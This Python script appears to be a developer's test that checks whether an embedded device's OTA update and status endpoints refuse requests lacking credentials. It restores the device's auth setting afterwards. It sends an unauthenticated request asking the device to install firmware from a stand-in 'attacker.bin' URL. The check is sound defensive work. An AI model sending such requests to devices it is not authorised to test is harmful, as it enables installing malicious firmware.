#!/usr/bin/env python3
"""Read what the two OTA trigger routes accept from a client with no credentials.

`/api/ota/check` and `/api/ota/update` are state changes: one starts a manifest
check, the other installs firmware from a URL the request supplies. Both were
gated on the per-boot CSRF token alone, while the upload route beside them also
asks for the device credentials. A token proves a request came from our own
page; it never proves who sent it.

The read routes beside them — `/api/ota/status`, `/api/ota/unified` and the
no-parameter branch of `/api/ota/update` — answered the same stranger with the
configured firmware URL, the running version and the update state.

The script enables authentication through `webui_settings`, then reads each
route without credentials and with, and restores the device's previous auth
state before it exits. The token is taken *before* auth is enabled, which is
what an observer of one earlier request has.

    ota_trigger_auth_check.py http://192.168.1.224 --user admin --password secret

Two shapes matter and are easy to get wrong:

* `/api/ui/action` reads its parameters from the **query string**, while
  `/api/ota/update` reads `url`/`force` from the **body**. A body sent to the
  first, or a query sent to the second, silently takes the read branch.
* `/api/ota/update` only takes its action branch when a body parameter is
  present; with none it is a read, and it is gated like the other reads.

What the HTTP codes cannot show is whether the component moved: with no
downloader wired (FullStack wires none) an accepted trigger ends at
`[OTA] State -> error | No downloader set` on the serial line. Read the port
while this runs; that log, not the 200, is the proof a request got through.
"""

import argparse
import base64
import json
import sys
import urllib.error
import urllib.parse
import urllib.request


def request(url: str, method: str = "GET", body: dict | None = None,
            user: str | None = None, password: str = "", timeout: float = 8.0):
    """Return (status, body text). Basic preemptively: the device accepts it."""
    data = urllib.parse.urlencode(body).encode() if body else None
    headers = {}
    if data:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    if user is not None:
        token = base64.b64encode(f"{user}:{password}".encode()).decode()
        headers["Authorization"] = f"Basic {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(256).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(256).decode("utf-8", "replace")
    except Exception as e:  # URLError, timeouts
        return 0, str(e)


def action(base: str, token: str, field: str, value: str, **auth):
    """One webui_settings write. Parameters go in the query string for this route."""
    query = urllib.parse.urlencode({
        "token": token, "contextId": "webui_settings", "field": field, "value": value,
    })
    return request(f"{base}/api/ui/action?{query}", "POST", **auth)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url", help="device base URL, e.g. http://192.168.1.224")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--password", default="bench-secret",
                    help="password to set and then authenticate with")
    ap.add_argument("--firmware-url", default="http://192.168.1.1:9/attacker.bin",
                    help="URL the update route is asked to install from")
    ap.add_argument("--keep-auth", action="store_true",
                    help="leave authentication enabled instead of restoring it")
    args = ap.parse_args()
    base = args.url.rstrip("/")
    creds = {"user": args.user, "password": args.password}

    status, body = request(f"{base}/api/ui/token")
    if status == 401:
        status, body = request(f"{base}/api/ui/token", **creds)
    if status != 200:
        print(f"no CSRF token: /api/ui/token answered {status} {body}", file=sys.stderr)
        return 2
    token = json.loads(body).get("token", "")
    print(f"token (taken before auth is enabled): {token}")

    print("\n-- enabling authentication through webui_settings --")
    for field, value in (("username", args.user), ("password", args.password),
                         ("enable_auth", "true")):
        code, text = action(base, token, field, value)
        if code != 200:
            code, text = action(base, token, field, value, **creds)
        shown = "(set)" if field == "password" else value
        print(f"  {field}={shown}: {code} {text.strip()[:80]}")

    gate = request(f"{base}/api/ui/token")[0]
    print(f"  gate witness: /api/ui/token without credentials -> {gate} "
          f"({'auth is on' if gate == 401 else 'AUTH IS NOT ON — the readings below prove nothing'})")

    print("\n-- the two trigger routes, without credentials, with a valid token --")
    rows = []
    code, text = request(f"{base}/api/ota/check?token={token}", "POST")
    rows.append(("POST /api/ota/check   no credentials", code, text))
    code, text = request(f"{base}/api/ota/update?token={token}", "POST",
                         body={"url": args.firmware_url, "force": "true"})
    rows.append(("POST /api/ota/update  no credentials", code, text))

    print("\n-- the same two with credentials --")
    code, text = request(f"{base}/api/ota/check?token={token}", "POST", **creds)
    rows.append(("POST /api/ota/check   with credentials", code, text))
    code, text = request(f"{base}/api/ota/update?token={token}", "POST",
                         body={"url": args.firmware_url, "force": "true"}, **creds)
    rows.append(("POST /api/ota/update  with credentials", code, text))

    print("\n-- the read routes, no credentials, then with --")
    for route in ("/api/ota/status", "/api/ota/unified"):
        code, text = request(f"{base}{route}")
        rows.append((f"GET  {route:17s} no credentials", code, text))
    # The no-parameter branch of the update route is a read like those two.
    code, text = request(f"{base}/api/ota/update", "POST")
    rows.append(("POST /api/ota/update  read branch", code, text))
    code, text = request(f"{base}/api/ota/status", **creds)
    rows.append(("GET  /api/ota/status  with credentials", code, text))

    print()
    for label, code, text in rows:
        print(f"{label:42s} -> {code} {text.strip()[:70]}")

    if not args.keep_auth:
        print("\n-- restoring: authentication off --")
        code, text = action(base, token, "enable_auth", "false", **creds)
        print(f"  enable_auth=false: {code} {text.strip()[:80]}")

    triggers = [c for _, c, _ in rows[:2] if c == 401]
    reads = [c for _, c, _ in rows[4:7] if c == 401]
    print(f"\nverdict: {len(triggers)}/2 trigger routes and {len(reads)}/3 read routes "
          f"refused a request with no credentials")
    return 0 if len(triggers) == 2 and len(reads) == 3 else 1


if __name__ == "__main__":
    sys.exit(main())
